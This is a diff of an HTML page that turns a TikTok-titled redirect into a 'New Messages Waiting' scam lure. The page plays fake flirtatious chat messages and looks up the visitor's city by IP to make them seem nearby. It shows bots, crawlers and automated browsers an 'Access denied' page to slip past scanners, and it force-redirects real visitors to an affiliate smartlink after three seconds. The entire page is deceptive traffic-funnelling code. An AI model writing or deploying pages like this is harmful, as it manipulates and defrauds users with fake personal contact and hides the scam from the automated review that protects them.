@@ -1,51 +1,188 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>TikTok</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>New Messages Waiting</title>
 
-  <!-- Force referrer behavior -->
-  <meta name="referrer" content="origin">
+<style>
+body {
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,sans-serif;
+  background:#0e0e0e;
+  color:white;
+  overflow-x:hidden;
+}
 
-  <!-- Auto redirect after 2 sec -->
-  <script>
-    setTimeout(function(){
-      window.location.href = "https://trustedoffers.pro/a/rkLmSDP2Jhzg87";
-    }, 2000);
-  </script>
+.container {
+  max-width:500px;
+  margin:auto;
+  padding:20px;
+}
 
-  <style>
-    body {
-      margin:0;
-      background:black;
-      color:white;
-      font-family:sans-serif;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      height:100vh;
-      text-align:center;
-    }
-    .box {
-      max-width:400px;
-    }
-    .btn {
-      background:#ff0050;
-      padding:15px 25px;
-      border-radius:30px;
-      display:inline-block;
-      margin-top:20px;
-      text-decoration:none;
-      color:white;
-      font-weight:bold;
-    }
-  </style>
+h1 {
+  font-size:22px;
+}
+
+.chat-box {
+  background:#1c1c1c;
+  padding:15px;
+  border-radius:15px;
+  margin-top:15px;
+  min-height:120px;
+}
+
+.msg {
+  background:#ff0050;
+  padding:10px 14px;
+  border-radius:20px;
+  display:inline-block;
+  margin-top:8px;
+  animation:fadeIn 0.5s ease forwards;
+}
+
+.cta {
+  margin-top:20px;
+  display:block;
+  text-align:center;
+  background:#ff0050;
+  padding:16px;
+  border-radius:40px;
+  text-decoration:none;
+  color:white;
+  font-weight:bold;
+  font-size:16px;
+}
+
+.popup {
+  position:fixed;
+  bottom:-200px;
+  left:0;
+  right:0;
+  background:#1c1c1c;
+  padding:20px;
+  text-align:center;
+  box-shadow:0 -5px 20px rgba(0,0,0,0.6);
+  transition:0.4s;
+}
+
+.popup.active {
+  bottom:0;
+}
+
+.popup button {
+  background:#ff0050;
+  border:none;
+  padding:12px 20px;
+  color:white;
+  border-radius:30px;
+  font-weight:bold;
+}
+
+@keyframes fadeIn {
+  from {opacity:0; transform:translateY(5px);}
+  to {opacity:1; transform:translateY(0);}
+}
+</style>
+
+<script>
+const SMARTLINK_BASE = "https://trustedoffers.pro/a/rkLmSDP2Jhzg87";
+
+// ===== Basic Anti-Bot =====
+function isBot() {
+  const ua = navigator.userAgent.toLowerCase();
+  return (
+    ua.includes("bot") ||
+    ua.includes("crawler") ||
+    ua.includes("spider") ||
+    navigator.webdriver === true ||
+    window.outerWidth === 0
+  );
+}
+
+// ===== Region Detection =====
+async function detectRegion() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    return data.city + ", " + data.country_name;
+  } catch {
+    return "your area";
+  }
+}
+
+// ===== Smartlink with passthrough =====
+function buildLink() {
+  return SMARTLINK_BASE + window.location.search;
+}
+
+// ===== Fake Chat Animation =====
+function startChat() {
+  const chat = document.getElementById("chat");
+
+  setTimeout(() => {
+    chat.innerHTML += '<div class="msg">Hey 😘 are you near me?</div>';
+  }, 800);
+
+  setTimeout(() => {
+    chat.innerHTML += '<div class="msg">I saw your profile ❤️</div>';
+  }, 1600);
+
+  setTimeout(() => {
+    chat.innerHTML += '<div class="msg">Click to unlock my private pics 🔥</div>';
+  }, 2400);
+}
+
+// ===== Init =====
+async function init() {
+  if (isBot()) {
+    document.body.innerHTML = "Access denied.";
+    return;
+  }
+
+  const region = await detectRegion();
+  document.getElementById("region").innerText = region;
+
+  const link = buildLink();
+  document.getElementById("ctaBtn").href = link;
+
+  startChat();
+
+  // 3 second redirect
+  setTimeout(() => {
+    window.location.href = link;
+  }, 3000);
+
+  // Show popup at 2.5s
+  setTimeout(() => {
+    document.getElementById("popup").classList.add("active");
+  }, 2500);
+}
+
+window.onload = init;
+</script>
 </head>
+
 <body>
-  <div class="box">
-    <h2>Loading recommended profiles...</h2>
-    <p>Please wait while we verify your region.</p>
-    <a class="btn" href="https://trustedoffers.pro/a/rkLmSDP2Jhzg87">Continue</a>
-  </div>
+
+<div class="container">
+
+  <h1>🔥 3 New Messages from <span id="region">your area</span></h1>
+
+  <div class="chat-box" id="chat"></div>
+
+  <a id="ctaBtn" class="cta" href="#">
+    View Messages
+  </a>
+
+</div>
+
+<div class="popup" id="popup">
+  <p><strong>Someone is waiting for you...</strong></p>
+  <button onclick="window.location.href=buildLink()">
+    Continue Now
+  </button>
+</div>
+
 </body>
 </html>
